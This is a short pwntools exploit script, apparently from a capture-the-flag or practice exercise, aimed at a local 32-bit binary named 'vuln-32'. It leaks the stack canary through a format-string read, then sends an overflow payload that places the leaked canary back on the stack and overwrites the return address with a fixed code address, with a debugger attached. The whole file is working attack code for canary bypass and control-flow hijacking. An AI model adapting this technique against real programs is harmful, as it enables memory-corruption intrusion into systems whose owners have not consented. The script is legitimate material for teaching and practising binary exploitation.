#!/usr/bin/python2

from pwn import *

p = process('./vuln-32')
log.info(p.clean())
p.sendline('%23$p')
canary = int(p.recvline(),16)

log.info("Canary : {}".format(hex(canary)))

payload = 'A'*64
payload += p32(canary)
payload += 'A'*12
payload += p32(0x08049245)

gdb.attach(p, 'b*vuln+125')
p.sendline(payload)
p.interactive()